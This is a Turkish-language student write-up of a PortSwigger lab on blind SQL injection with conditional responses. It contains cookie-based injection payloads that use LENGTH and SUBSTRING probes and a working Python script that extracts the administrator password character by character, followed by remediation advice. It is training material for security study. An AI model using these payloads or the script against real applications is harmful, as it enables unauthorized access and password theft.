# SQLi Lab #8: Blind SQLi — conditional responses (+ Python otomasyon) — 29.10.2026

> İlk blind SQLi. Şimdiye kadar sonucu ekranda görüyorduk; burada sorgu çalışır ama sonucundan HİÇBİR iz yok. Veriyi, uygulamanın davranış farkından (evet/hayır) karakter karakter çıkarıyoruz. Ayrıca ilk otomasyon (Python).

**Lab:** PortSwigger → SQL injection → Blind → *Blind SQL injection with conditional responses* (Practitioner)
**Görev:** administrator'ın şifresini blind yolla çıkar, onunla giriş yap.

## Blind SQLi mantığı (analoji)
Kapalı kutu / 20 soru oyunu: içini göremezsin ama evet/hayır sorup kutunun tepkisini okursun. Burada "tepki" = sayfadaki bir mesajın görünüp görünmemesi (oracle).

## Enjeksiyon noktası + oracle
- Enjeksiyon noktası görünür bir input değil: **`TrackingId` çerezi.** Uygulama onu arka planda bir sorguda kullanıyor (`... WHERE TrackingId = 'deger'`).
- Oracle = **"Welcome back" mesajı** (Burp Repeater'ın **response**'unda okunur, tarayıcıda değil).
- Kanıt (doğru/yanlış testi):
  - `TrackingId=xxx' AND 1=1--` → Welcome back **var** (koşul doğru).
  - `TrackingId=xxx' AND 1=2--` → Welcome back **yok** (koşul yanlış).
  Fark ispatlar: mesaj gerçekten benim koşuluma bağlı → oracle çalışıyor.

## Veri çıkarma (manuel mantık)
1. **administrator var mı?** `' AND (SELECT username FROM users WHERE username='administrator')='administrator'--` → Welcome back → var. (Not: sütun `username`; `USER` built-in fonksiyondur, karıştırma.)
2. **Şifre uzunluğu — `LENGTH`:** `' AND (... AND LENGTH(password)>N)='administrator'--`, binary search ile daralt. `>19` var, `>20` yok → uzunluk **20**.
3. **Her karakter — `SUBSTRING`:** `' AND (SELECT SUBSTRING(password,POZ,1) FROM users WHERE username='administrator')='X'--`, POZ=1..20 ve X=her karakter. Welcome back çıkan = doğru karakter.

İlk birkaç karakter elle çıkarıldı (mantığı hissetmek için); sonra otomasyon.

## Otomasyon (Python) — angaryayı makineye
20 karakter × 36 olasılık = yüzlerce istek → elle yapılmaz. Mantık bir kez kurulur, script defalarca çalıştırır:
```python
import requests
import time

url = "https://LAB-ID.web-security-academy.net/"
base = "GEÇERLI_TRACKINGID"   # Burp'teki TrackingId değeri (sadece değer)

charset = "0123456789abcdefghijklmnopqrstuvwxyz"
password = ""

for pozisyon in range(1, 21):            # 20 karakter -> range(1,21)
    for karakter in charset:
        payload = base + f"' AND (SELECT SUBSTRING(password,{pozisyon},1) FROM users WHERE username='administrator')='{karakter}'--"
        response = requests.get(url, cookies={"TrackingId": payload})
        if "Welcome back" in response.text:
            password += karakter
            print(f"{pozisyon}. karakter: {karakter}  ->  {password}")
            break
    time.sleep(0.1)

print(f"\nŞifre: {password}")
```
Özü: **dış döngü pozisyon, iç döngü charset, "Welcome back" varsa karakteri kaydet + break.** Çıkan şifreyle `administrator` olarak login → **Solved.** ✅
(Önemli: bu script Burp'e/çereze yapıştırılmaz; terminalde `python3 blind.py` ile çalışır — istekleri kendisi gönderir.)

## In-band vs Blind (temel fark)
- **In-band / UNION:** sorgunun sonucu yanıtın İÇİNDE gelir → veriyi doğrudan **görürsün.**
- **Blind:** sonucu hiç görmezsin → veriyi uygulamanın **davranışından** (doğru/yanlış, ya da süre) **çıkarırsın**, tek tek.
- Gerçek hayata yakın olmasının sebebi: gerçek uygulamalar veriyi/hatayı cömertçe göstermez → saldırı çoğu zaman blind olur.

## Takıldığı yerler (öğretici)
- `SELECT USER` (fonksiyon) ≠ `SELECT username` (sütun) — precision.
- Uzunluğu birkaç kez eksik sayma (off-by-one: "10"/`1..19`) → doğrusu 20, `range(1,21)`. Blind'da bu, şifrenin son karakterini kaçırmak demek.
- Script'i terminalde çalıştırmak gerektiği (Burp'e yapıştırmak değil).

## 🛡️ Nasıl kapatılır (remediation)
- **Asıl çözüm — parameterized queries:** `TrackingId` çerez değeri de ayrı parametre olarak gitmeli; string birleştirmeyle sorguya gömülmemeli.
- **Yaygın yanılgı:** "hata mesajını/çıktıyı gizlersem güvenli olur" — HAYIR. Çıktıyı gizlemek zafiyeti blind yapar, yok etmez; hâlâ sömürülür. Asıl düzeltme parameterization.
- **Defense-in-depth:** şifreleri hash'le (bcrypt/Argon2) → blind'la çekilse bile düz şifre alınamaz; least privilege.

## Zincir bağı
- Önceki SQLi'lerde sonucu görüyorduk; blind'da "görememe"yi "davranıştan çıkarma"ya çevirdik.
- İlk otomasyon adımı: elle kurulan mantığın Python'a dökülmesi. Sıradaki blind türleri (conditional errors, time-based) aynı oracle fikrinin farklı sinyalleri.
